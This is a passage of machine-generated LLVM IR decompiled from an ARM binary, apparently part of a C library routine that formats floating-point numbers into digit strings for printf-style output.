  %v0_16540 = phi i32 [ %v0_1655c, %dec_label_pc_16534.dec_label_pc_16534_crit_edge ], [ 0, %dec_label_pc_164f0 ]
  %v0_1654c = phi i32 [ %v2_16558, %dec_label_pc_16534.dec_label_pc_16534_crit_edge ], [ %v0_16534.pre, %dec_label_pc_164f0 ]
  %v3_1653c = urem i32 %v0_1654c, 10
  %v1_16540 = add i32 %v0_16540, 1
  store i32 %v1_16540, i32* %r7.global-to-local, align 4
  %v1_16544 = or i32 %v3_1653c, 48
  store i32 %v1_16544, i32* %r2.global-to-local, align 4
  %v2_16548 = sub i32 %v1_16548, %v1_16540
  store i32 %v2_16548, i32* %r3.global-to-local, align 4
  store i32 %v0_1654c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16554 = trunc i32 %v1_16544 to i8
  %v3_16554 = inttoptr i32 %v2_16548 to i8*
  store i8 %v1_16554, i8* %v3_16554, align 1
  %v0_16558 = load i32, i32* %r0.global-to-local, align 4
  %v1_16558 = load i32, i32* %r1.global-to-local, align 4
  %v2_16558 = udiv i32 %v0_16558, %v1_16558
  store i32 %v2_16558, i32* %r0.global-to-local, align 4
  %v0_1655c = load i32, i32* %r7.global-to-local, align 4
  %v7_1655c = icmp eq i32 %v0_1655c, 8
  store i1 %v7_1655c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16558, i32* %r8.global-to-local, align 4
  %v7_16564 = icmp slt i32 %v0_1655c, 9
  br i1 %v7_16564, label %dec_label_pc_16534.dec_label_pc_16534_crit_edge, label %dec_label_pc_16568

dec_label_pc_16534.dec_label_pc_16534_crit_edge:  ; preds = %dec_label_pc_16534
  %v1_16548.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_16568:                               ; preds = %dec_label_pc_16534
  %v0_16568 = load i32, i32* %r4.global-to-local, align 4
  %v1_16568 = add i32 %v0_16568, 1
  store i32 %v1_16568, i32* %r4.global-to-local, align 4
  %v7_1656c = icmp eq i32 %v0_16568, 0
  store i1 %v7_1656c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1656c, label %dec_label_pc_164f0, label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_16568
  %v0_16574 = load i32, i32* %sb.global-to-local, align 4
  %v7_16574 = icmp eq i32 %v0_16574, 96
  store i1 %v7_16574, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_16574, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_16574
  %v5_16584 = add i32 %v0_16574, 32
  store i32 %v5_16584, i32* %r3.global-to-local, align 4
  %v5_16588 = urem i32 %v5_16584, 256
  store i32 %v5_16588, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_16574
  %v4_16580.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_16580.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_16580126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_165a8 = phi i32 [ %v0_16574, %thread-pre-split ], [ %v5_16588, %bb213 ]
  %v7_1658c = icmp eq i32 %v0_165a8, 103
  %. = zext i1 %v7_1658c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_16598 = load i32, i32* %fp.global-to-local, align 4
  %v2_16598 = icmp eq i32 %v0_16598, 0
  store i1 %v2_16598, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_16598, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_165a0 = icmp eq i1 %v7_1658c, false
  store i1 %v2_165a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_165a0, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_165a4 = add i32 %v0_16598, -1
  store i32 %v2_165a4, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_165b8 = phi i32 [ %v0_16598, %.thread16 ], [ %v0_16598, %bb218 ], [ %v2_165a4, %bb219 ]
  %v7_165a8 = icmp eq i32 %v0_165a8, 102
  store i1 %v7_165a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_165a8, label %dec_label_pc_165b4, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_165b8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_165dc

dec_label_pc_165b4:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_165b8 = add i32 %v0_165b8, %stack_var_-192.4
  store i32 %v2_165b8, i32* %ip.global-to-local, align 4
  %v8_165bc = icmp eq i32 %v2_165b8, -1
  store i1 %v8_165bc, i1* %cpsr_z.global-to-local, align 1
  %v6_165c0 = icmp slt i32 %v2_165b8, -1
  br i1 %v6_165c0, label %dec_label_pc_165c4, label %dec_label_pc_165dc

dec_label_pc_165c4:                               ; preds = %dec_label_pc_165b4
  %v2_165c4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_165c4, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_165d0 = bitcast i32* %stack_var_-83 to i8*
  %v3_165d0 = call i32 @__GI_memset(i8* %v2_165d0, i32 48)
  store i32 %v3_165d0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %bb221, %dec_label_pc_165b4, %dec_label_pc_165c4
  %v1_1662092 = phi i32 [ %v3_165d0, %dec_label_pc_165c4 ], [ %v2_16558, %dec_label_pc_165b4 ], [ %v2_16558, %bb221 ]
  %v1_16604 = phi i32 [ -1, %dec_label_pc_165c4 ], [ %v2_165b8, %dec_label_pc_165b4 ], [ %v0_165b8, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_165c4 ], [ %stack_var_-192.4, %dec_label_pc_165b4 ], [ %stack_var_-192.4, %bb221 ]
  %v1_165e0 = add i32 %v1_16604, -16
  %v3_165e0 = sub i32 15, %v1_16604
  %v4_165e0 = and i32 %v3_165e0, %v1_16604
  %v5_165e0 = icmp slt i32 %v4_165e0, 0
  %v6_165e0 = icmp slt i32 %v1_165e0, 0
  %v7_165e0 = icmp eq i32 %v1_16604, 16
  store i1 %v7_165e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_165ec = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_165ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_165f4 = xor i1 %v6_165e0, %v5_165e0
  %v4_165f4 = or i1 %v7_165e0, %v3_165f4
  br i1 %v4_165f4, label %dec_label_pc_16600, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_165dc
  %v7_165f4137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_165f4137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_16600:                               ; preds = %dec_label_pc_165dc
  %v2_16600 = ptrtoint i32* %stack_var_-82 to i32
  %v2_16604 = add i32 %v1_16604, %v2_16600
  store i32 %v2_16604, i32* %r3.global-to-local, align 4
  %v1_16608 = add i32 %v2_16604, 2
  %v2_16608 = inttoptr i32 %v1_16608 to i8*
  %v3_16608 = load i8, i8* %v2_16608, align 1
  %v4_16608 = zext i8 %v3_16608 to i32
  store i32 %v4_16608, i32* %r2.global-to-local, align 4
  store i32 %v1_16608, i32* %r1.global-to-local, align 4
  %v2_16610 = icmp ugt i8 %v3_16608, 51
  %v7_16610 = icmp eq i8 %v3_16608, 52
  store i1 %v7_16610, i1* %cpsr_z.global-to-local, align 1
  %v2_16614 = xor i1 %v2_16610, true
  %v3_16614 = or i1 %v7_16610, %v2_16614
  br i1 %v3_16614, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_16600
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_16600, %bb222
  %v1_1662090 = phi i32 [ %v1_1662092, %dec_label_pc_16600 ], [ 0, %bb222 ]
  %v2_16618 = xor i1 %v7_16610, true
  %v3_16618 = and i1 %v2_16610, %v2_16618
  br i1 %v3_16618, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_1661c = phi i32 [ %v0_1661c.pre, %._crit_edge87 ], [ %v7_165f4137141, %.thread140 ], [ %v1_16608, %bb223 ], [ %v1_16608, %bb224 ]
  %v1_16620 = phi i32 [ %v1_16620.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1662090, %bb223 ], [ 1, %bb224 ]
  %v1_1661c = add i32 %v0_1661c, -1
  %v2_1661c = inttoptr i32 %v1_1661c to i8*
  %v3_1661c = load i8, i8* %v2_1661c, align 1
  %v4_1661c = zext i8 %v3_1661c to i32
  store i32 %v1_1661c, i32* %r1.global-to-local, align 4
  %v2_16620 = add i32 %v4_1661c, %v1_16620
  %v1_16624 = urem i32 %v2_16620, 256
  store i32 %v1_16624, i32* %r3.global-to-local, align 4
  %v2_16628 = icmp ugt i32 %v1_16624, 56
  %v7_16628 = icmp eq i32 %v1_16624, 57
  store i1 %v7_16628, i1* %cpsr_z.global-to-local, align 1
  %v2_1662c = xor i1 %v2_16628, true
  %v3_1662c = or i1 %v7_16628, %v2_1662c
  br i1 %v3_1662c, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_16630 = xor i1 %v7_16628, true
  %v3_16630 = and i1 %v2_16628, %v2_16630
  br i1 %v3_16630, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_16638.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_16638 = phi i32 [ %v1_16638.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_16634 = icmp eq i32 %v1_16624, 48
  store i1 %v7_16634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16634, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_16638 = or i32 %v1_16638, 1
  store i32 %v2_16638, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1663c = phi i32 [ 1, %bb229 ], [ %v1_16638, %bb228 ]
  %v2_1663c = icmp eq i32 %v0_1663c, 0
  store i1 %v2_1663c, i1* %cpsr_z.global-to-local, align 1
  %v1_16640 = trunc i32 %v2_16620 to i8
  store i8 %v1_16640, i8* %v2_1661c, align 1
  %v0_16644 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16644, label %dec_label_pc_16648, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_16620.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1661c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_16648:                               ; preds = %._crit_edge93
  store i32 %v2_165ec, i32* %r2.global-to-local, align 4
  %v2_1664c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1664c, i32* %r3.global-to-local, align 4
  %v0_16650 = load i32, i32* %r1.global-to-local, align 4
  %v3_16650 = icmp uge i32 %v0_16650, %v2_1664c
  %v9_16650 = icmp eq i32 %v0_16650, %v2_1664c
  store i1 %v9_16650, i1* %cpsr_z.global-to-local, align 1
  %v2_16654 = xor i1 %v3_16650, true
  %v3_16654 = or i1 %v9_16650, %v2_16654
  br i1 %v3_16654, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_16648
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1664c, i32* %r2.global-to-local, align 4
  store i32 %v2_1664c, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_16648, %bb230
  %v2_16674 = phi i32 [ %v2_1664c, %bb230 ], [ %v0_16650, %dec_label_pc_16648 ]
  %v4_16668144 = phi i32 [ %v2_1664c, %bb230 ], [ %v2_165ec, %dec_label_pc_16648 ]
  %v2_16660 = xor i1 %v9_16650, true
  %v3_16660 = and i1 %v3_16650, %v2_16660
  br i1 %v3_16660, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_16654, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_16664 = load i32, i32* @lr, align 4
  %v5_16664 = add i32 %v4_16664, 1
  store i32 %v5_16664, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_16660, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_16668 = add i32 %v4_16668144, 2
  store i32 %v5_16668, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16670 = load i32, i32* %sb.global-to-local, align 4
  %v7_16670 = icmp eq i32 %v0_16670, 103
  store i1 %v7_16670, i1* %cpsr_z.global-to-local, align 1
  %v3_16674 = add i32 %v2_16674, 1
  %v4_16674 = inttoptr i32 %v3_16674 to i8*
  store i8 0, i8* %v4_16674, align 1
  %v0_16678 = load i32, i32* %r1.global-to-local, align 4
  %v1_16678 = add i32 %v0_16678, 1
  store i32 %v1_16678, i32* %lr.global-to-local, align 4
  %v0_1667c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1667c, label %dec_label_pc_16680, label %dec_label_pc_166a8

dec_label_pc_16680:                               ; preds = %bb236
  %v0_16680 = load i32, i32* %r0.global-to-local, align 4
  %v1_16680 = load i32, i32* %ip.global-to-local, align 4
  %v2_16680 = sub i32 %v0_16680, %v1_16680
  %v4_16680 = xor i32 %v1_16680, %v0_16680
  %v5_16680 = xor i32 %v2_16680, %v0_16680
  %v6_16680 = and i32 %v5_16680, %v4_16680
  %v7_16680 = icmp slt i32 %v6_16680, 0
  %v8_16680 = icmp slt i32 %v2_16680, 0
  %v9_16680 = icmp eq i32 %v0_16680, %v1_16680
  %v3_16684 = xor i1 %v8_16680, %v7_16680
  %v4_16684 = or i1 %v9_16680, %v3_16684
  %.258 = zext i1 %v4_16684 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1668c = add i32 %v0_16680, 4
  %v3_1668c = sub i32 0, %v0_16680
  %v4_1668c = and i32 %v1_1668c, %v3_1668c
  %v5_1668c = icmp slt i32 %v4_1668c, 0
  %v6_1668c = icmp slt i32 %v1_1668c, 0
  %v7_1668c = icmp eq i32 %v1_1668c, 0
  store i1 %v7_1668c, i1* %cpsr_z.global-to-local, align 1
  %v2_16690 = xor i1 %v6_1668c, %v5_1668c
  br i1 %v2_16690, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_16680
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_169c4

bb239:                                            ; preds = %dec_label_pc_16680
  %v2_16694 = icmp eq i1 %v4_16684, false
  store i1 %v2_16694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16694, label %dec_label_pc_169c4, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_16698 = sub i32 %v1_16680, %v0_16680
  store i32 %v3_16698, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_166b4

dec_label_pc_166a8:                               ; preds = %bb236
  %v0_166a8 = load i32, i32* %sb.global-to-local, align 4
  %v7_166a8 = icmp eq i32 %v0_166a8, 102
  store i1 %v7_166a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_166a8, i32* %r8.global-to-local, align 4
  br i1 %v7_166a8, label %dec_label_pc_166a8.dec_label_pc_166b4_crit_edge, label %dec_label_pc_166c4

dec_label_pc_166a8.dec_label_pc_166b4_crit_edge:  ; preds = %dec_label_pc_166a8
  %v0_166b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_166b4

dec_label_pc_166b4:                               ; preds = %.thread24, %dec_label_pc_166a8.dec_label_pc_166b4_crit_edge
  %v0_166b4 = phi i32 [ %v0_166b4.pre, %dec_label_pc_166a8.dec_label_pc_166b4_crit_edge ], [ %v0_16680, %.thread24 ]
  %v1_166b4 = icmp slt i32 %v0_166b4, 0
  %v2_166b4 = icmp eq i32 %v0_166b4, 0
  store i1 %v2_166b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_166b4, label %bb240, label %dec_label_pc_166c4

bb240:                                            ; preds = %dec_label_pc_166b4
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_166bc = load i32, i32* %r2.global-to-local, align 4
  %v6_166bc = add i32 %v5_166bc, -1
  %v7_166bc = inttoptr i32 %v6_166bc to i8*
  store i8 48, i8* %v7_166bc, align 1
  %v8_166bc = load i32, i32* %r2.global-to-local, align 4
  %v9_166bc = add i32 %v8_166bc, -1
  store i32 %v9_166bc, i32* %r2.global-to-local, align 4
  %v0_166c0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_166f4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_166c4

dec_label_pc_166c4:                               ; preds = %bb240, %dec_label_pc_166b4, %dec_label_pc_169c4, %dec_label_pc_166a8
  %v1_166f4 = phi i32 [ %v1_16678, %dec_label_pc_166a8 ], [ %v1_16678, %dec_label_pc_169c4 ], [ %v1_166f4.pre.pre, %bb240 ], [ %v1_16678, %dec_label_pc_166b4 ]
  %v1_1676c30 = phi i32 [ 0, %dec_label_pc_166a8 ], [ 0, %dec_label_pc_169c4 ], [ %v0_166c0.pre, %bb240 ], [ %v0_166b4, %dec_label_pc_166b4 ]
  store i32 %v1_1676c30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_166d0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_166d0, i32* %r3.global-to-local, align 4
  %v0_166dc = load i32, i32* %r2.global-to-local, align 4
  %v1_166dc = inttoptr i32 %v0_166dc to i8*
  %v2_166dc = load i8, i8* %v1_166dc, align 1
  %v3_166dc = zext i8 %v2_166dc to i32
  store i32 %v3_166dc, i32* %r3.global-to-local, align 4
  %v5_166dc = add i32 %v0_166dc, 1
  store i32 %v5_166dc, i32* %r2.global-to-local, align 4
  %v1_166e0 = icmp slt i32 %v1_1676c30, 0
  %v2_166e0 = icmp eq i32 %v1_1676c30, 0
  store i1 %v2_166e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_166dc, i32* %r6.global-to-local, align 4
  store i32 %v3_166dc, i32* %stack_var_-42, align 4
  %v2_166f4 = sub i32 %v1_166f4, %v5_166dc
  store i32 %v2_166f4, i32* %ip.global-to-local, align 4
  br i1 %v1_166e0, label %.thread, label %dec_label_pc_16700

.thread:                                          ; preds = %dec_label_pc_166c4
  %v5_166f8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_166f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_16700:                               ; preds = %dec_label_pc_166c4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16704 = sub i32 %v1_1676c30, %v2_166f4
  %v4_16704 = xor i32 %v2_166f4, %v1_1676c30
  %v5_16704 = xor i32 %v2_16704, %v1_1676c30
  %v6_16704 = and i32 %v5_16704, %v4_16704
  %v7_16704 = icmp slt i32 %v6_16704, 0
  %v8_16704 = icmp slt i32 %v2_16704, 0
  %v9_16704 = icmp eq i32 %v1_1676c30, %v2_166f4
  store i1 %v9_16704, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_16710 = xor i1 %v8_16704, %v7_16704
  br i1 %v2_16710, label %dec_label_pc_1675c, label %dec_label_pc_16714

dec_label_pc_16714:                               ; preds = %dec_label_pc_16700
  store i32 %v2_16704, i32* %r2.global-to-local, align 4
  %v2_16718 = icmp eq i32 %v2_16704, 0
  store i1 %v2_16718, i1* %cpsr_z.global-to-local, align 1
  %v2_1671c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1671c, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_16704, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_16730

.thread148:                                       ; preds = %dec_label_pc_16714
  %v7_16724 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_16724, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_16730:                               ; preds = %dec_label_pc_16714
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v2_16740 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_16740, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1675c:                               ; preds = %dec_label_pc_16700
  store i1 %v2_166e0, i1* %cpsr_z.global-to-local, align 1
  %v2_16760 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16760, i32* %lr.global-to-local, align 4
  br i1 %v2_166e0, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1675c
  %v3_16768 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_16768, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_1675c
  %v3_1676c = sub i32 %v2_166f4, %v1_1676c30
  store i32 %v3_1676c, i32* %ip.global-to-local, align 4
  %v3_1677063 = add i32 %v5_166dc, %v1_1676c30
  store i32 %v3_1677063, i32* %r6.global-to-local, align 4
  %v3_16774 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_16774, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_167bc265 = phi i32 [ %v3_16768, %bb242 ], [ %v3_16774, %bb243 ], [ %v7_16724, %.thread148 ]
  %v0_16790102 = phi i32 [ %v2_166f4, %bb242 ], [ %v3_1676c, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1677c:                               ; preds = %.thread, %dec_label_pc_16730, %.thread34
  %v1_167bc = phi i32 [ %v2_16740, %dec_label_pc_16730 ], [ %v1_167bc265, %.thread34 ], [ %v5_166f8, %.thread ]
  %v0_167d0109 = phi i32 [ -1, %dec_label_pc_16730 ], [ -1, %.thread34 ], [ %v1_1676c30, %.thread ]
  %v0_16790 = phi i32 [ 0, %dec_label_pc_16730 ], [ %v0_16790102, %.thread34 ], [ %v2_166f4, %.thread ]
  %v3_1677c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1677c, i32* %r2.global-to-local, align 4
  %v1_16780 = add i32 %v3_1677c, 12
  %v2_16780 = inttoptr i32 %v1_16780 to i32*
  %v3_16780 = load i32, i32* %v2_16780, align 4
  %v1_16784 = and i32 %v3_16780, 16
  store i32 %v1_16784, i32* %r4.global-to-local, align 4
  %v2_16784 = icmp eq i32 %v1_16784, 0
  %tmp270 = zext i1 %v2_16784 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_16790 = icmp eq i32 %v0_16790, 0
  store i1 %v2_16790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16790, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1677c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_167ac

bb246:                                            ; preds = %dec_label_pc_1677c
  store i1 %v2_16784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16784, label %dec_label_pc_167a0, label %dec_label_pc_167ac

dec_label_pc_167a0:                               ; preds = %bb246
  %v0_167a0 = load i32, i32* %sb.global-to-local, align 4
  %v7_167a0 = icmp eq i32 %v0_167a0, 103
  store i1 %v7_167a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167a0, label %dec_label_pc_167d0, label %bb247

bb247:                                            ; preds = %dec_label_pc_167a0
  %v1_167a4 = load i32, i32* %fp.global-to-local, align 4
  %v3_167a4 = icmp eq i32 %v1_167a4, 0
  store i1 %v3_167a4, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_167a4, 1
  br i1 %tmp248, label %dec_label_pc_167d0, label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_167bc = inttoptr i32 %v1_167bc to i32*
  store i32 112, i32* %v2_167bc, align 4
  %v0_167c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_167c0 = add i32 %v0_167c0, 16
  store i32 %v1_167c0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_167c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_167c8 = add i32 %v0_167c8, 4
  %v2_167c8 = inttoptr i32 %v1_167c8 to i32*
  store i32 1, i32* %v2_167c8, align 4
  %v4_167c8 = add i32 %v0_167c8, 8
  %v5_167c8 = inttoptr i32 %v4_167c8 to i32*
  %v6_167c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_167c8, i32* %v5_167c8, align 4
  %v0_167cc = load i32, i32* %r7.global-to-local, align 4
  %v1_167cc = add i32 %v0_167cc, 12
  store i32 %v1_167cc, i32* %r7.global-to-local, align 4
  %v0_167d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_167d0

dec_label_pc_167d0:                               ; preds = %dec_label_pc_167a0, %bb247, %dec_label_pc_167ac
  %v1_167f0 = phi i32 [ %v1_167bc, %bb247 ], [ %v1_167cc, %dec_label_pc_167ac ], [ %v1_167bc, %dec_label_pc_167a0 ]
  %v0_167d0 = phi i32 [ %v0_167d0109, %bb247 ], [ %v0_167d0.pre, %dec_label_pc_167ac ], [ %v0_167d0109, %dec_label_pc_167a0 ]
  %v1_167d0 = add i32 %v0_167d0, 1
  store i32 %v1_167d0, i32* %lr.global-to-local, align 4
  %v6_167d0 = icmp slt i32 %v1_167d0, 0
  %v7_167d0 = icmp eq i32 %v1_167d0, 0
  store i1 %v7_167d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_167d0, label %dec_label_pc_167d8, label %dec_label_pc_167fc

dec_label_pc_167d8:                               ; preds = %dec_label_pc_167d0
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_167e8 = sub i32 -1, %v0_167d0
  store i32 %v1_167e8, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_167f0 = inttoptr i32 %v1_167f0 to i32*
  store i32 176, i32* %v2_167f0, align 4
  %v0_167f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_167f4 = add i32 %v0_167f4, 4
  %v2_167f4 = inttoptr i32 %v1_167f4 to i32*
  %v3_167f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_167f4, i32* %v2_167f4, align 4
  %v4_167f4 = add i32 %v0_167f4, 8
  %v5_167f4 = inttoptr i32 %v4_167f4 to i32*
  %v6_167f4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_167f4, i32* %v5_167f4, align 4
  %v0_167f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_167f8 = add i32 %v0_167f8, 12
  store i32 %v1_167f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_167fc

dec_label_pc_167fc:                               ; preds = %dec_label_pc_167d0, %dec_label_pc_167d8
  %v2_16804 = phi i32 [ %v1_167f0, %dec_label_pc_167d0 ], [ %v1_167f8, %dec_label_pc_167d8 ]
  %v0_167fc = load i32, i32* %ip.global-to-local, align 4
  %v2_167fc = icmp eq i32 %v0_167fc, 0
  store i1 %v2_167fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167fc, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_167fc
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_16804 = inttoptr i32 %v2_16804 to i32*
  store i32 112, i32* %v3_16804, align 4
  %v1_16808 = load i32, i32* %r6.global-to-local, align 4
  %v2_16808 = load i32, i32* %r7.global-to-local, align 4
  %v3_16808 = add i32 %v2_16808, 8
  %v4_16808 = inttoptr i32 %v3_16808 to i32*
  store i32 %v1_16808, i32* %v4_16808, align 4
